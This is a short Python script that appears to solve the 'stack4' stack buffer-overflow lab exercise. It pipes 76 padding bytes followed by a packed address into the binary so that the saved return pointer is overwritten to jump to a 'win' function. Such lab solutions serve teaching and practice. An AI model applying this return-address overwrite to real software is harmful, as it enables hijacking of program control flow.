#!/usr/bin/python

import struct

#NOTE
#Usage:
#./exploit.py | ./stack4
PAD = "A" * 76

WIN_FUNCTION = struct.pack("I" , 0x080483f4)
#Change the value of the pointer from return to win function.

exploit = PAD + WIN_FUNCTION
print exploit
